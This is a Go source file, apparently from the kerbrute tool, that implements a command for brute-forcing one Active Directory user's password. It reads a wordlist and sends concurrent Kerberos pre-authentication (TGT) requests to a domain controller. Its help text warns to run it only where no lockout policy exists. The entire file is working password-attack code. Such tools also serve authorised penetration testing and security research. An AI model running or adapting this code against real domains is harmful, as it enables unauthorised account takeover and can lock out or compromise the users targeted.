package cmd

import (
	"bufio"
	"os"
	"sync"
	"sync/atomic"
	"time"

	"github.com/ropnop/kerbrute/util"

	"github.com/spf13/cobra"
)

// bruteuserCmd represents the bruteuser command
var bruteuserCmd = &cobra.Command{
	Use:   "bruteuser [flags] <password_list> username",
	Short: "Bruteforce a single user's password from a wordlist",
	Long: `Will perform a password bruteforce against a single domain user using Kerberos Pre-Authentication by requesting at TGT from the KDC.
If no domain controller is specified, the tool will attempt to look one up via DNS SRV records.
A full domain is required. This domain will be capitalized and used as the Kerberos realm when attempting the bruteforce.
WARNING: only run this if there's no lockout policy!`,
	Args:   cobra.ExactArgs(2),
	PreRun: setupSession,
	Run:    bruteForceUser,
}

func init() {
	rootCmd.AddCommand(bruteuserCmd)
}

func bruteForceUser(cmd *cobra.Command, args []string) {
	passwordlist := args[0]
	stopOnSuccess = true
	kSession.SafeMode = true
	username, err := util.FormatUsername(args[1])
	if err != nil {
		logger.Log.Error(err.Error())
		return
	}

	passwordsChan := make(chan string, threads)
	defer cancel()

	var wg sync.WaitGroup
	wg.Add(threads)

	var scanner *bufio.Scanner
	if passwordlist != "-" {
		file, err := os.Open(passwordlist)
		if err != nil {
			logger.Log.Error(err.Error())
			return
		}
		defer file.Close()
		scanner = bufio.NewScanner(file)
	} else {
		scanner = bufio.NewScanner(os.Stdin)
	}

	for i := 0; i < threads; i++ {
		go makeBruteWorker(ctx, passwordsChan, &wg, username)
	}

	start := time.Now()

	var password string
Scan:
	for scanner.Scan() {
		select {
		case <-ctx.Done():
			break Scan
		default:
			password = scanner.Text()
			time.Sleep(time.Duration(delay) * time.Millisecond)
			passwordsChan <- password
		}
	}
	close(passwordsChan)
	wg.Wait()

	finalCount := atomic.LoadInt32(&counter)
	finalSuccess := atomic.LoadInt32(&successes)
	logger.Log.Infof("Done! Tested %d logins (%d successes) in %.3f seconds", finalCount, finalSuccess, time.Since(start).Seconds())

	if err := scanner.Err(); err != nil {
		logger.Log.Error(err.Error())
	}

}
